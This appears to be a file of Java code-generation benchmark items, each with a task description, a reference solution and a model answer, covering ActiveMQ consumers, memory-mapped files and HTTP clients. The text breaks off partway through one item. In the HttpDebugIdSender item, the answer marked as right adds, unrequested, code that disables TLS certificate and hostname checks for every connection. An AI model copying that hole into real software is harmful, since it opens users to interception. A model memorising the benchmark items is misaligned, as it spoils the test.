[
  {
    "Task_id": 1,
    "Instruction": "Task Description: Create a Java class that implements an ActiveMQ message consumer capable of receiving messages from a specified queue, processing different message types (TextMessage and BytesMessage), and handling connection exceptions.\n\nClass Description: The ActiveMqConsumer class implements Runnable and ExceptionListener interfaces to asynchronously consume messages from an ActiveMQ broker while handling connection exceptions. It manages the JMS connection lifecycle and provides methods to start/stop the consumer.\n\nAttributes:\n- connection: Connection - JMS connection to the ActiveMQ broker\n- session: Session - JMS session for message processing\n- consumer: MessageConsumer - JMS message consumer for receiving messages\n- remoteUri: String - URI of the ActiveMQ broker\n- queueName: String - Name of the queue to consume messages from\n\nMethods:\n- ActiveMqConsumer(String remoteUri, String queueName) -> None - Constructor that initializes the broker URI and queue name\n- start() -> void - Creates connection factory, establishes connection, creates session and consumer\n- stop() -> void - Closes consumer, session and connection resources\n- run() -> void - Continuously receives and processes messages (TextMessage/BytesMessage)\n- onException(JMSException e) -> void - Exception handler that stops the consumer on connection errors\n- getConnection() -> Connection - Returns the JMS connection\n- getSession() -> Session - Returns the JMS session\n- getConsumer() -> MessageConsumer - Returns the message consumer",
    "Canonical_solution": "import javax.jms.BytesMessage;\nimport javax.jms.Connection;\nimport javax.jms.Destination;\nimport javax.jms.ExceptionListener;\nimport javax.jms.JMSException;\nimport javax.jms.Message;\nimport javax.jms.MessageConsumer;\nimport javax.jms.Session;\nimport javax.jms.TextMessage;\nimport org.apache.activemq.ActiveMQConnectionFactory;\nimport com.sitewhere.spi.SiteWhereException;\n\npublic class ActiveMqConsumer implements Runnable, ExceptionListener {\n\n    private Connection connection;\n    private Session session;\n    private MessageConsumer consumer;\n    private String remoteUri;\n    private String queueName;\n\n    public ActiveMqConsumer(String remoteUri, String queueName) {\n        this.remoteUri = remoteUri;\n        this.queueName = queueName;\n    }\n\n    public void start() throws SiteWhereException {\n        try {\n            ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory(remoteUri);\n            this.connection = connectionFactory.createConnection();\n            this.connection.setExceptionListener(this);\n            this.connection.start();\n            this.session = this.connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n            Destination destination = this.session.createQueue(queueName);\n            this.consumer = this.session.createConsumer(destination);\n        } catch (Exception e) {\n            throw new SiteWhereException(\"Error starting ActiveMQ consumer.\", e);\n        }\n    }\n\n    public void stop() throws SiteWhereException {\n        try {\n            this.consumer.close();\n            this.session.close();\n            this.connection.close();\n        } catch (Exception e) {\n            throw new SiteWhereException(\"Error shutting down ActiveMQ consumer.\", e);\n        }\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                Message message = consumer.receive();\n                if (message == null) {\n                    break;\n                }\n                if (message instanceof TextMessage) {\n                    TextMessage textMessage = (TextMessage) message;\n                    byte[] payload = textMessage.getText().getBytes();\n                    // Process payload here\n                } else if (message instanceof BytesMessage) {\n                    BytesMessage bytesMessage = (BytesMessage) message;\n                    byte[] buffer = new byte[(int) bytesMessage.getBodyLength()];\n                    // Process buffer here\n                }\n            } catch (Throwable e) {\n                return;\n            }\n        }\n    }\n\n    @Override\n    public void onException(JMSException e) {\n        try {\n            stop();\n        } catch (SiteWhereException e1) {\n        }\n    }\n\n    protected Connection getConnection() {\n        return connection;\n    }\n\n    protected Session getSession() {\n        return session;\n    }\n\n    protected MessageConsumer getConsumer() {\n        return consumer;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 39,
    "right_result": "```java\nimport org.apache.activemq.ActiveMQConnectionFactory;\nimport javax.jms.*;\n\npublic class ActiveMqConsumer implements Runnable, ExceptionListener {\n    private Connection connection;\n    private Session session;\n    private MessageConsumer consumer;\n    private String remoteUri;\n    private String queueName;\n\n    public ActiveMqConsumer(String remoteUri, String queueName) {\n        this.remoteUri = remoteUri;\n        this.queueName = queueName;\n    }\n\n    public void start() throws JMSException {\n        ConnectionFactory connectionFactory = new ActiveMQConnectionFactory(remoteUri);\n        connection = connectionFactory.createConnection();\n        connection.setExceptionListener(this);\n        connection.start();\n        session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n        Destination destination = session.createQueue(queueName);\n        consumer = session.createConsumer(destination);\n    }\n\n    public void stop() throws JMSException {\n        if (consumer != null) {\n            consumer.close();\n        }\n        if (session != null) {\n            session.close();\n        }\n        if (connection != null) {\n            connection.close();\n        }\n    }\n\n    public void run() {\n        try {\n            while (true) {\n                Message message = consumer.receive(1000);\n                if (message == null) continue;\n                if (message instanceof TextMessage) {\n                    System.out.println(\"Received TextMessage: \" + ((TextMessage) message).getText());\n                } else if (message instanceof BytesMessage) {\n                    byte[] bytes = new byte[(int) ((BytesMessage) message).getBodyLength()];\n                    ((BytesMessage) message).readBytes(bytes);\n                    System.out.println(\"Received BytesMessage: \" + new String(bytes));\n                } else {\n                    System.out.println(\"Received unknown message type: \" + message.getClass().getName());\n                }\n            }\n        } catch (JMSException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void onException(JMSException e) {\n        System.err.println(\"JMS Exception occurred. Stopping consumer.\");\n        e.printStackTrace();\n        try {\n            stop();\n        } catch (JMSException ex) {\n            ex.printStackTrace();\n        }\n    }\n\n    public Connection getConnection() {\n        return connection;\n    }\n\n    public Session getSession() {\n        return session;\n    }\n\n    public MessageConsumer getConsumer() {\n        return consumer;\n    }\n}\n```"
  },
  {
    "Task_id": 10,
    "Instruction": "Task Description: Create a Java class that provides read-only access to file contents using MemorySegment and FileChannel for efficient memory-mapped file operations.\n\nClass Description: MemorySegmentReaderSupplier is a utility class that implements ReaderSupplier interface, designed to provide memory-mapped file reading capabilities. It uses Java NIO's FileChannel to map a file into memory as a MemorySegment, allowing efficient read operations. The class manages memory resources through an Arena and automatically handles resource cleanup.\n\nAttributes:\n- arena: Arena - Manages the lifecycle of the memory segment and ensures proper cleanup\n- memory: MemorySegment - The memory-mapped representation of the file content\n\nMethods:\n- Constructor: MemorySegmentReaderSupplier(Path path) throws IOException - Initializes the reader by opening the specified file and mapping it into memory. Throws IOException if file operations fail.\n- get: get() -> MemorySegmentReader - Returns a new MemorySegmentReader instance for accessing the memory-mapped file content\n- close: close() -> void - Releases all allocated resources by closing the arena and unmapping the memory segment",
    "Canonical_solution": "import java.io.IOException;\nimport java.lang.foreign.Arena;\nimport java.lang.foreign.MemorySegment;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class MemorySegmentReaderSupplier implements ReaderSupplier {\n    private final Arena arena;\n    private final MemorySegment memory;\n\n    public MemorySegmentReaderSupplier(Path path) throws IOException {\n        this.arena = Arena.ofShared();\n        try (var ch = FileChannel.open(path, StandardOpenOption.READ)) {\n            this.memory = ch.map(FileChannel.MapMode.READ_ONLY, 0L, ch.size(), arena);\n        } catch (Throwable e) {\n            arena.close();\n            if (e instanceof IOException) {\n                throw (IOException) e;\n            }\n            throw new RuntimeException(e);\n        }\n    }\n\n    @Override\n    public MemorySegmentReader get() {\n        return new MemorySegmentReader(memory);\n    }\n\n    @Override\n    public void close() {\n        arena.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.lang.foreign.Arena;\nimport java.lang.foreign.MemorySegment;\n\npublic class MemorySegmentReaderSupplier implements AutoCloseable {\n    private final Arena arena;\n    private final MemorySegment memory;\n\n    public MemorySegmentReaderSupplier(Path path) throws IOException {\n        try (FileChannel fileChannel = FileChannel.open(path)) {\n            this.arena = Arena.ofShared();\n            this.memory = fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, fileChannel.size(), arena);\n        }\n    }\n\n    public MemorySegmentReader get() {\n        return new MemorySegmentReader(memory);\n    }\n\n    @Override\n    public void close() {\n        if (arena != null) {\n            arena.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 100,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests for sending debug information to a server, including handling redirects and SSL connections.\n\nClass Description: HttpDebugIdSender is a utility class designed to send debug information to a specified server URL using HTTP POST requests. It handles JSON payload construction, SSL connections (when needed), and follows redirects if necessary. The class includes error logging and proper resource cleanup.\n\nAttributes:\n- distinctId: String - Unique identifier for the debug session\n- infoId: String - Additional information ID to be included in the URL\n- serverUrl: String - Base URL of the server to which debug information will be sent\n\nMethods:\n- HttpDebugIdSender(String serverUrl, String distinctId, String infoId) -> None - Constructor that initializes the class with server URL, distinct ID, and info ID\n- send() -> None - Initiates the HTTP request to send debug information\n- sendHttpRequest(String serverUrl, boolean isRedirects) -> None - Internal method that handles the actual HTTP request, including connection setup, payload sending, and response handling\n- closeStream(ByteArrayOutputStream out, OutputStream out2, BufferedOutputStream bout, HttpURLConnection connection) -> None - Helper method to safely close all open streams and connections",
    "Canonical_solution": "import android.content.Context;\nimport com.sensorsdata.analytics.android.sdk.SALog;\nimport com.sensorsdata.analytics.android.sdk.SensorsDataAPI;\nimport com.sensorsdata.analytics.android.sdk.util.NetworkUtils;\nimport com.sensorsdata.analytics.android.sdk.util.TimeUtils;\n\nimport java.io.BufferedOutputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class HttpDebugIdSender {\n    private String distinctId;\n    private String infoId;\n    private String serverUrl;\n\n    public HttpDebugIdSender(String serverUrl, String distinctId, String infoId) {\n        this.distinctId = distinctId;\n        this.infoId = infoId;\n        this.serverUrl = serverUrl;\n    }\n\n    public void send() {\n        sendHttpRequest(serverUrl, false);\n    }\n\n    private void sendHttpRequest(String serverUrl, boolean isRedirects) {\n        ByteArrayOutputStream out = null;\n        OutputStream out2 = null;\n        BufferedOutputStream bout = null;\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(String.format(serverUrl + \"&info_id=%s\", infoId));\n            SALog.info(\"HttpDebugIdSender\", String.format(\"DebugMode URL:%s\", url), null);\n            connection = (HttpURLConnection) url.openConnection();\n            if (connection == null) {\n                SALog.info(\"HttpDebugIdSender\", String.format(\"can not connect %s,shouldn't happen\", url.toString()), null);\n                return;\n            }\n            SAConfigOptions configOptions = SensorsDataAPI.getConfigOptions();\n            if (configOptions != null && configOptions.getSSLSocketFactory() != null\n                    && connection instanceof HttpsURLConnection) {\n                ((HttpsURLConnection) connection).setSSLSocketFactory(configOptions.getSSLSocketFactory());\n            }\n            connection.setInstanceFollowRedirects(false);\n            out = new ByteArrayOutputStream();\n            OutputStreamWriter writer = new OutputStreamWriter(out);\n            String requestBody = \"{\\\"distinct_id\\\": \\\"\" + distinctId + \"\\\"}\";\n            writer.write(requestBody);\n            writer.flush();\n            SALog.info(\"HttpDebugIdSender\", String.format(\"DebugMode request body : %s\", requestBody), null);\n            connection.setDoOutput(true);\n            connection.setUseCaches(false);\n            connection.setRequestMethod(\"POST\");\n            connection.setRequestProperty(\"Content-type\", \"text/plain\");\n\n            out2 = connection.getOutputStream();\n            bout = new BufferedOutputStream(out2);\n            bout.write(out.toString().getBytes(\"UTF-8\"));\n            bout.flush();\n            out.close();\n            int responseCode = connection.getResponseCode();\n            SALog.info(\"HttpDebugIdSender\", String.format(TimeUtils.SDK_LOCALE, \"DebugMode ResponseCode: %d\", responseCode), null);\n            if (!isRedirects && NetworkUtils.needRedirects(responseCode)) {\n                String location = NetworkUtils.getLocation(connection, serverUrl);\n                if (!TextUtils.isEmpty(location)) {\n                    closeStream(out, out2, bout, connection);\n                    sendHttpRequest(location, true);\n                }\n            }\n        } catch (Exception e) {\n            SALog.printStackTrace(e);\n        } finally {\n            closeStream(out, out2, bout, connection);\n        }\n    }\n\n    private void closeStream(ByteArrayOutputStream out, OutputStream out2, BufferedOutputStream bout, HttpURLConnection connection) {\n        if (out != null) {\n            try {\n                out.close();\n            } catch (Exception e) {\n                SALog.printStackTrace(e);\n            }\n        }\n        if (out2 != null) {\n            try {\n                out2.close();\n            } catch (Exception e) {\n                SALog.printStackTrace(e);\n            }\n        }\n        if (bout != null) {\n            try {\n                bout.close();\n            } catch (Exception e) {\n                SALog.printStackTrace(e);\n            }\n        }\n        if (connection != null) {\n            try {\n                connection.disconnect();\n            } catch (Exception e) {\n                SALog.printStackTrace(e);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\nimport javax.net.ssl.*;\n\npublic class HttpDebugIdSender {\n    private final String serverUrl;\n    private final String distinctId;\n    private final String infoId;\n\n    public HttpDebugIdSender(String serverUrl, String distinctId, String infoId) {\n        this.serverUrl = serverUrl;\n        this.distinctId = distinctId;\n        this.infoId = infoId;\n    }\n\n    public void send() {\n        try {\n            sendHttpRequest(serverUrl, false);\n        } catch (IOException | KeyManagementException | NoSuchAlgorithmException e) {\n            Logger.getLogger(HttpDebugIdSender.class.getName()).log(Level.SEVERE, \"Error sending debug data\", e);\n        }\n    }\n\n    private void sendHttpRequest(String urlStr, boolean isRedirects) throws IOException, KeyManagementException, NoSuchAlgorithmException {\n        URL url = new URL(urlStr);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n\n        if (!isRedirects) {\n            disableSslVerification();\n        }\n\n        connection.setRequestMethod(\"POST\");\n        connection.setConnectTimeout(5000);\n        connection.setReadTimeout(10000);\n        connection.setDoOutput(true);\n        connection.setInstanceFollowRedirects(false);\n\n        String fullUrl = urlStr + \"?info_id=\" + infoId;\n        connection.setURL(new URL(fullUrl));\n\n        try (ByteArrayOutputStream out = new ByteArrayOutputStream();\n             OutputStream out2 = connection.getOutputStream();\n             BufferedOutputStream bout = new BufferedOutputStream(out2)) {\n\n            String jsonInputString = \"{ \\\"distinct_id\\\": \\\"\" + distinctId + \"\\\" }\";\n            byte[] inputBytes = jsonInputString.getBytes(\"UTF-8\");\n\n            bout.write(inputBytes);\n            bout.flush();\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_MOVED_PERM || responseCode == HttpURLConnection.HTTP_MOVED_TEMP) {\n                String newUrl = connection.getHeaderField(\"Location\");\n                if (newUrl != null) {\n                    sendHttpRequest(newUrl, true);\n                }\n            } else if (responseCode >= 400) {\n                Logger.getLogger(HttpDebugIdSender.class.getName()).log(Level.WARNING, \"Server returned HTTP response code: {0}\", responseCode);\n            }\n        } finally {\n            closeStream(null, null, null, connection);\n        }\n    }\n\n    private void closeStream(ByteArrayOutputStream out, OutputStream out2, BufferedOutputStream bout, HttpURLConnection connection) {\n        try {\n            if (out != null) out.close();\n            if (out2 != null) out2.close();\n            if (bout != null) bout.close();\n            if (connection != null) connection.disconnect();\n        } catch (IOException ex) {\n            Logger.getLogger(HttpDebugIdSender.class.getName()).log(Level.SEVERE, \"Error closing streams\", ex);\n        }\n    }\n\n    private void disableSslVerification() throws KeyManagementException, NoSuchAlgorithmException {\n        TrustManager[] trustAllCerts = new TrustManager[]{\n            new X509TrustManager() {\n                public java.security.cert.X509Certificate[] getAcceptedIssuers() {\n                    return null;\n                }\n\n                public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {\n                }\n\n                public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {\n                }\n            }\n        };\n\n        SSLContext sslContext = SSLContext.getInstance(\"SSL\");\n        sslContext.init(null, trustAllCerts, new java.security.SecureRandom());\n        HttpsURLConnection.setDefaultSSLSocketFactory(sslContext.getSocketFactory());\n        HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);\n    }\n}\n```"
  },
  {
    "Task_id": 102,
    "Instruction": "Task Description: Create a Java class that demonstrates how to make an HTTP request using HttpURLConnection, including setting connection timeouts and request headers, and handling the response.\n\nClass Description: The CleartextHttpCredentialsTest class is designed to test basic HTTP connectivity with a target URL. It demonstrates how to establish a connection, set timeouts, add request headers, and retrieve response information. The class focuses on proper resource cleanup after the connection is used.\n\nAttributes:\n- TARGET: [String] - A constant storing the URL to which the HTTP request will be made\n\nMethods:\n- runTest: [runTest]() -> [void] - Executes the HTTP request to the target URL. Sets connection timeouts, adds an Authorization header, retrieves the response code and message, and ensures proper connection cleanup. Throws Exception if any step fails.",
    "Canonical_solution": "import java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class CleartextHttpCredentialsTest {\n\n  private static final String TARGET = \"http://www.google.com\";\n\n  public void runTest() throws Exception {\n    HttpURLConnection connection = null;\n    try {\n      connection = (HttpURLConnection) new URL(TARGET).openConnection();\n      connection.setConnectTimeout(20000);\n      connection.setReadTimeout(20000);\n      connection.setRequestProperty(\"Authorization\", \"value\");\n      int responseCode = connection.getResponseCode();\n      String responseMessage = connection.getResponseMessage();\n    } finally {\n      if (connection != null) {\n        connection.disconnect();\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class CleartextHttpCredentialsTest {\n    private static final String TARGET = \"https://example.com\";\n\n    public void runTest() throws Exception {\n        URL url = new URL(TARGET);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n\n        try {\n            connection.setRequestMethod(\"GET\");\n            connection.setConnectTimeout(5000);\n            connection.setReadTimeout(5000);\n            connection.setRequestProperty(\"Authorization\", \"Basic dXNlcm5hbWU6cGFzc3dvcmQ=\");\n            connection.setRequestProperty(\"User-Agent\", \"Java HttpClient/1.1\");\n\n            int responseCode = connection.getResponseCode();\n            String responseMessage = connection.getResponseMessage();\n\n            System.out.println(\"Response Code: \" + responseCode);\n            System.out.println(\"Response Message: \" + responseMessage);\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n\n            in.close();\n            System.out.println(\"Response Body: \" + content.toString());\n        } finally {\n            connection.disconnect();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 104,
    "Instruction": "Task Description: Create a function that performs an HTTP/HTTPS request with XML data and parses the XML response into a key-value map.\n\nFunction Description: This function sends an HTTP/HTTPS request (GET/POST) to a specified URL with XML data as input, then parses the XML response into a Map<String, Object> where keys are XML element names and values are their text content. The function handles connection setup, request configuration, data transmission, response parsing, and resource cleanup.\n\nInput:\n- requestUrl: String - The target URL for the HTTP request\n- requestMethod: String - The HTTP method to use (e.g., \"GET\" or \"POST\")\n- xmlStr: String - The XML data to send with the request (can be null for GET requests)\n\nOutput:\n- Map<String, Object> - A map containing key-value pairs parsed from the XML response, where keys are XML element names and values are their text content",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.HashMap;\nimport javax.net.ssl.HttpsURLConnection;\n\npublic static Map<String, Object> httpXmlRequest(String requestUrl, String requestMethod, String xmlStr) {\n    Map<String, Object> map = new HashMap<String, Object>();\n    try {\n        HttpsURLConnection urlCon = (HttpsURLConnection) (new URL(requestUrl)).openConnection();\n        urlCon.setDoInput(true);\n        urlCon.setDoOutput(true);\n        urlCon.setRequestMethod(requestMethod);\n\n        if (\"GET\".equalsIgnoreCase(requestMethod)) {\n            urlCon.connect();\n        }\n\n        urlCon.setRequestProperty(\"Content-Length\", String.valueOf(xmlStr.getBytes().length));\n        urlCon.setUseCaches(false);\n        if (null != xmlStr) {\n            OutputStream outputStream = urlCon.getOutputStream();\n            outputStream.write(xmlStr.getBytes(\"UTF-8\"));\n            outputStream.flush();\n            outputStream.close();\n        }\n        InputStream inputStream = urlCon.getInputStream();\n        InputStreamReader inputStreamReader = new InputStreamReader(inputStream, \"UTF-8\");\n        SAXReader reader = new SAXReader();\n        Document document = reader.read(inputStreamReader);\n        Element root = document.getRootElement();\n        List<Element> elementList = root.elements();\n        for (Element e : elementList) {\n            map.put(e.getName(), e.getText());\n        }\n        inputStreamReader.close();\n        inputStream.close();\n        inputStream = null;\n        urlCon.disconnect();\n    } catch (MalformedURLException e) {\n        LOG.error(e.getMessage());\n    } catch (IOException e) {\n        LOG.error(e.getMessage());\n    } catch (Exception e) {\n        LOG.error(e.getMessage());\n    }\n    return map;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport org.w3c.dom.*;\nimport javax.xml.parsers.*;\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class XmlHttpRequestHandler {\n\n    public static Map<String, Object> sendXmlRequest(String requestUrl, String requestMethod, String xmlStr) throws Exception {\n        Map<String, Object> result = new HashMap<>();\n        HttpURLConnection connection = (HttpURLConnection) new URL(requestUrl).openConnection();\n\n        if (requestMethod.equalsIgnoreCase(\"POST\")) {\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n            connection.setRequestProperty(\"Content-Type\", \"application/xml; charset=UTF-8\");\n            try (OutputStream os = connection.getOutputStream()) {\n                byte[] input = xmlStr.getBytes(\"utf-8\");\n                os.write(input, 0, input.length);\n            }\n        } else {\n            connection.setRequestMethod(\"GET\");\n        }\n\n        try (InputStream is = connection.getInputStream()) {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(is);\n            doc.getDocumentElement().normalize();\n\n            parseNode(doc.getDocumentElement(), result);\n        } finally {\n            connection.disconnect();\n        }\n\n        return result;\n    }\n\n    private static void parseNode(Node node, Map<String, Object> map) {\n        if (node.getNodeType() == Node.ELEMENT_NODE) {\n            Element element = (Element) node;\n            NodeList children = element.getChildNodes();\n            Map<String, Object> childMap = new HashMap<>();\n\n            for (int i = 0; i < children.getLength(); i++) {\n                Node child = children.item(i);\n                parseNode(child, childMap);\n            }\n\n            if (!childMap.isEmpty()) {\n                map.put(element.getTagName(), childMap);\n            } else if (element.getTextContent().trim().length() > 0) {\n                map.put(element.getTagName(), element.getTextContent().trim());\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 105,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality using HttpURLConnection for making HTTP requests and handling responses.\n\nClass Description: The Http class provides a static method for sending HTTP requests to a specified URL with configurable request methods and payloads. It handles connection setup, request sending, response reading, and resource cleanup.\n\nMethods:\n\nMethod1: httpsRequest(String requestUrl, String requestMethod, String outputStr) -> String - Sends an HTTP request to the specified URL using the given method and optional request body, then returns the response as a string.\n  - requestUrl: String - The target URL for the HTTP request\n  - requestMethod: String - The HTTP method to use (e.g., \"GET\", \"POST\")\n  - outputStr: String - The request body to send (can be null for requests without body)\n  - Returns: String - The response body from the server, or null if an error occurs\n\nThe method handles:\n1. Creating and configuring HttpURLConnection\n2. Setting request headers (content-type: text/xml; charset=UTF-8)\n3. Sending request body if provided\n4. Reading and concatenating response\n5. Proper resource cleanup\n6. Error handling and logging",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport com.scudata.common.Logger;\n\npublic class Http {\n    public static String httpsRequest(String requestUrl, String requestMethod, String outputStr) {    \n        try {    \n            URL url = new URL(requestUrl);    \n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();    \n              \n            conn.setDoOutput(true);    \n            conn.setDoInput(true);    \n            conn.setUseCaches(false);    \n            conn.setRequestMethod(requestMethod);    \n            conn.setRequestProperty(\"content-type\", \"text/xml; charset=UTF-8\");\n            \n            if (null != outputStr) {    \n                OutputStream outputStream = conn.getOutputStream();    \n                outputStream.write(outputStr.getBytes(\"UTF-8\"));    \n                outputStream.close();    \n            }    \n            \n            InputStream inputStream = conn.getInputStream();    \n            InputStreamReader inputStreamReader = new InputStreamReader(inputStream, \"utf-8\");    \n            BufferedReader bufferedReader = new BufferedReader(inputStreamReader);    \n            String str = null;  \n            StringBuffer buffer = new StringBuffer();    \n            while ((str = bufferedReader.readLine()) != null) {    \n                buffer.append(str);    \n            }    \n            \n            bufferedReader.close();    \n            inputStreamReader.close();    \n            inputStream.close();    \n            inputStream = null;    \n            conn.disconnect();    \n            return buffer.toString();    \n        } catch (Exception e) {    \n            System.out.println(\"http exception{}\"+ e);\n            Logger.error(e.getMessage());\n        }    \n        return null;    \n    }    \n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class Http {\n\n    public static String httpsRequest(String requestUrl, String requestMethod, String outputStr) {\n        StringBuilder response = new StringBuilder();\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(requestUrl);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(requestMethod);\n            connection.setConnectTimeout(5000);\n            connection.setReadTimeout(5000);\n            connection.setRequestProperty(\"Content-Type\", \"text/xml; charset=UTF-8\");\n            connection.setDoInput(true);\n\n            if (outputStr != null && !outputStr.isEmpty()) {\n                connection.setDoOutput(true);\n                try (OutputStream os = connection.getOutputStream()) {\n                    byte[] input = outputStr.getBytes(\"UTF-8\");\n                    os.write(input, 0, input.length);\n                }\n            }\n\n            int responseCode = connection.getResponseCode();\n            BufferedReader reader;\n            if (responseCode >= 400) {\n                reader = new BufferedReader(new InputStreamReader(connection.getErrorStream(), \"UTF-8\"));\n            } else {\n                reader = new BufferedReader(new InputStreamReader(connection.getInputStream(), \"UTF-8\"));\n            }\n\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n        return response.toString();\n    }\n}\n```"
  },
  {
    "Task_id": 106,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests asynchronously to fetch and process JSON data from a given URL.\n\nClass Description: HttpRequestHandler is a utility class that contains nested classes and methods for performing asynchronous HTTP requests and processing JSON responses. The main functionality is implemented through an AsyncTask subclass to avoid blocking the main thread during network operations.\n\nAttributes: \n(None - This is a utility class with no instance attributes)\n\nMethods:\n\nMethod1: MyAsyncTaskgetNews(String... params) -> String - A nested AsyncTask class that performs HTTP GET requests in the background. It takes a URL as input, establishes a connection, retrieves data, and processes the response.\n\nMethod2: onProgressUpdate(String... progress) -> void - A callback method that processes the received JSON data during the task's execution. It parses the JSON array and extracts individual JSON objects.\n\nMethod3: onPostExecute(String result2) -> void - A callback method that handles post-execution tasks after the background operation completes.\n\nMethod4: ConvertInputToStringNoChange(InputStream inputStream) -> String - A helper method that converts an InputStream into a String by reading all lines from the input stream and concatenating them.",
    "Canonical_solution": "import android.os.AsyncTask;\nimport org.json.JSONArray;\nimport org.json.JSONObject;\nimport java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                String NewsData;\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    NewsData = ConvertInputToStringNoChange(in);\n                    publishProgress(NewsData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {}\n            return null;\n        }\n\n        protected void onProgressUpdate(String... progress) {\n            try {\n                JSONArray json = new JSONArray(progress[0]);\n                for (int i = 0; i < json.length(); i++) {\n                    JSONObject user = json.getJSONObject(i);\n                    // Handle the parsed JSON data here\n                }\n            } catch (Exception ex) {}\n        }\n\n        protected void onPostExecute(String result2) {\n            // Handle post-execution tasks here\n        }\n    }\n\n    public static String ConvertInputToStringNoChange(InputStream inputStream) {\n        BufferedReader bureader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        String linereultcal = \"\";\n\n        try {\n            while ((line = bureader.readLine()) != null) {\n                linereultcal += line;\n            }\n            inputStream.close();\n        } catch (Exception ex) {}\n\n        return linereultcal;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport android.os.AsyncTask;\nimport org.json.JSONArray;\nimport org.json.JSONObject;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public static class MyAsyncTask extends AsyncTask<String, String, String> {\n\n        @Override\n        protected String doInBackground(String... params) {\n            HttpURLConnection urlConnection = null;\n            BufferedReader reader = null;\n            String resultJson = \"\";\n\n            try {\n                URL url = new URL(params[0]);\n                urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setRequestMethod(\"GET\");\n                urlConnection.connect();\n\n                InputStream inputStream = urlConnection.getInputStream();\n                resultJson = ConvertInputToStringNoChange(inputStream);\n\n                publishProgress(resultJson);\n            } catch (Exception e) {\n                e.printStackTrace();\n            } finally {\n                if (urlConnection != null) {\n                    urlConnection.disconnect();\n                }\n            }\n\n            return resultJson;\n        }\n\n        @Override\n        protected void onProgressUpdate(String... progress) {\n            super.onProgressUpdate(progress);\n            String jsonStr = progress[0];\n            try {\n                JSONArray jsonArray = new JSONArray(jsonStr);\n                for (int i = 0; i < jsonArray.length(); 